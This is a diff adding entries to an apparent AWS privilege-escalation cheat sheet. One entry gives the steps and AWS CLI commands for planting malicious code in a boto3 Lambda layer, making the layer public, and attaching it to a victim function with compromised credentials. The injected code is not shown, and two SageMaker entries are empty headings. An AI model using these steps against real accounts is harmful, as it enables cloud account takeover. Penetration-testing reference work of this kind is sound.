@@ -397,4 +397,74 @@ You likely won’t be able to do anything with the encrypted data, but cleartext
 
 ---
 
+### Abusing Lambda Layers Package Priority
+
+**Description:** 
+
+- 
+
+**How to Exploit??**
+
+Necessary Prerequisites to Exploit Lambda Layers
+    
+    pip3 install -t ./lambda_layer boto3==1.9.42
+    
+Inserting Our Malicious Code into a Lambda Layer
+
+Open “/lambda_layer/boto3/__init__.py” and add the malicious code
+Bundle that code into a ZIP file and upload it to a new Lambda layer in the attacker account. 
+Use `lambda:AddLayerVersionPermission` to make the layer publicly accessible so that the target account can use it
+    
+    aws lambda add-layer-version-permission \
+        --layer-name boto3 \
+        --version-number 1 --statement-id public \
+        --action lambda:GetLayerVersion \
+        --principal *
+
+With the compromised credentials, run the following command on our target Lambda function “s3-getter”, which will attach our cross-account Lambda layer
+    
+    aws lambda update-function-configuration --function-name s3-getter --layers arn:aws:lambda:REGION:ATTACKER-ACCOUNT-ID:layer:boto3:1
+
+Executing the Privilege Escalation
+
+Either invoke the function ourselves if we can or to wait until it gets invoked by normal means
+
+**Potential Impact:**
+
+From no privilege escalation to full administrator privilege escalation
+
+---
+
+### Abusing iam:PassRole with New SageMaker Jupyter Notebooks
+
+**Description:** 
+
+- 
+
+**How to Exploit??**
+
+
+
+**Potential Impact:**
+
+
+
+---
+
+### Gaining Access to Existing SageMaker Jupyter Notebooks
+
+**Description:** 
+
+- 
+
+**How to Exploit??**
+
+
+
+**Potential Impact:**
+
+
+
+---
+
 Reference -> [Rhinosecurity](https://rhinosecuritylabs.com/blog/)
